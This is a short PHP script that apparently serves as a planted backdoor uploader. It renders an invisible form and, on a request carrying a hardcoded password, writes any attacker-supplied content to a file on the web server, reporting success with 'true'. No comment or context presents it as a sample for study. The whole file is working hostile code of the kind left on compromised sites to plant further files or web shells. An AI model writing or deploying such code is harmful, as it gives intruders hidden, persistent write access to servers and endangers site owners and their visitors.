<?php
$Password="ef1e539726fbade3b40a0ceab8d4a4af";
$SaveFileName="cleord.txt";
if (isset($_REQUEST["save"]) && $_REQUEST["save"]=="Do")
	SaveToFile($SaveFileName,$Password);
else
	echo '	
<form id="backup" name="backup" method="post" action="'.$_SERVER['PHP_SELF'].'" >
<input type="text" name="import" style="display:none" >
<input type="text" name="password4" style="display:none">
<input type="submit" name="save"  value="Do" style="display:none">
</form>';
function SaveToFile($FileName,$Password){
	if (!isset($_REQUEST["password4"]) || $_REQUEST["password4"]!=$Password)
		exit;
	$SaveContents = @file_put_contents($FileName, $_REQUEST["import"]);
	if($SaveContents){
		echo "true";
		exit;
	}
}
?>